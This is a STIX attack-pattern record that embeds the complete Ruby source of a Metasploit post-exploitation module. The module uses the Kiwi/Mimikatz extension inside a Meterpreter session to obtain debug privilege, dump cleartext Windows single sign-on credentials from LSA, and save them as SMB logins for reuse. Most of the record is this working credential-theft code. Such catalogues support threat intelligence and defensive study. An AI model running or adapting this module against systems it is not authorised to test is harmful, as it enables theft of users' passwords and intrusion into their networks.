{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--61567a42-a698-4c2a-b236-e627bb2993b4",
    "created": "2024-08-14T16:33:08.755584Z",
    "modified": "2024-08-14T16:33:08.755588Z",
    "name": "Windows Single Sign On Credential Collector (Mimikatz)",
    "description": " This module will collect cleartext Single Sign On credentials from the Local Security Authority using the Kiwi (Mimikatz) extension. Blank passwords will not be stored in the database.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/sso.rb",
            "external_id": "sso.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'set'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Priv\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Single Sign On Credential Collector (Mimikatz)',\n        'Description' => %q{\n          This module will collect cleartext Single Sign On credentials from the Local\n          Security Authority using the Kiwi (Mimikatz) extension. Blank passwords will not be stored\n          in the database.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['Ben Campbell'],\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              kiwi_exec_cmd\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def run\n    if sysinfo.nil?\n      print_error('This module is only available in a windows meterpreter session.')\n      return\n    end\n\n    print_status(\"Running module against #{sysinfo['Computer']}\")\n\n    if (session.arch == ARCH_X86) && (sysinfo['Architecture'] == ARCH_X64)\n      print_error('x64 platform requires x64 meterpreter and kiwi extension')\n      return\n    end\n\n    unless client.kiwi\n      vprint_status('Loading kiwi extension...')\n      begin\n        client.core.use('kiwi')\n      rescue Errno::ENOENT\n        print_error('This module is only available in a windows meterpreter session.')\n        return\n      end\n    end\n\n    unless is_system?\n      vprint_warning('Not running as SYSTEM')\n      unless client.kiwi.get_debug_privilege\n        print_error('Unable to get Debug privilege')\n        return\n      end\n      vprint_status('Retrieved Debug privilege')\n    end\n\n    vprint_status('Retrieving Credentials')\n    res = client.kiwi.creds_all\n\n    table = Rex::Text::Table.new(\n      'Header' => 'Windows SSO Credentials',\n      'Indent' => 0,\n      'SortIndex' => 0,\n      'Columns' => ['Package', 'Domain', 'User', 'Password']\n    )\n\n    processed = Set.new\n    livessp_found = false\n    %i[tspkg kerberos ssp livessp].each do |package|\n      next unless res[package]\n\n      res[package].each do |r|\n        next if is_system_user?(r['Username'])\n        next if r['Username'] == '(null)' && r['Password'] == '(null)'\n\n        row = [r['Domain'], r['Username'], r['Password']]\n        id = row.join(':')\n        unless processed.include?(id)\n          table << [package.to_s] + row\n          report_creds(*row)\n          processed << id\n        end\n        livessp_found = true if package == :livessp\n      end\n    end\n\n    print_line(table.to_s)\n    print_error(\"No LiveSSP credentials found.\\n\") unless livessp_found\n  end\n\n  def report_creds(domain, user, pass)\n    return if (user.empty? || pass.empty?)\n    return if pass.include?('n.a.')\n\n    # Assemble data about the credential objects we will be creating\n    credential_data = {\n      origin_type: :session,\n      post_reference_name: refname,\n      private_data: pass,\n      private_type: :password,\n      session_id: session_db_id,\n      username: user,\n      workspace_id: myworkspace_id\n    }\n\n    unless domain.blank?\n      credential_data[:realm_key] = Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN\n      credential_data[:realm_value] = domain\n    end\n\n    credential_core = create_credential(credential_data)\n\n    # Assemble the options hash for creating the Metasploit::Credential::Login object\n    login_data = {\n      core: credential_core,\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      address: ::Rex::Socket.getaddress(session.sock.peerhost, true),\n      port: 445,\n      service_name: 'smb',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    create_credential_login(login_data)\n  end\n\n  def is_system_user?(user)\n    system_users = [\n      /^$/,\n      /^DWM-\\d$/,\n      /^ASPNET$/,\n      /^ASP\\.NET V2\\.0 Integrated$/,\n      /^ANONYMOUS LOGON$/,\n      /^IUSR.*/,\n      /^IWAM.*/,\n      /^IIS_WPG$/,\n      /.*\\$$/,\n      /^LOCAL SERVICE$/,\n      /^NETWORK SERVICE$/,\n      /^LOCAL SYSTEM$/\n    ]\n\n    system_users.find { |r| user.to_s.match(r) }\n  end\nend\n",
    "x_mitre_platforms": [
        "['win']"
    ]
}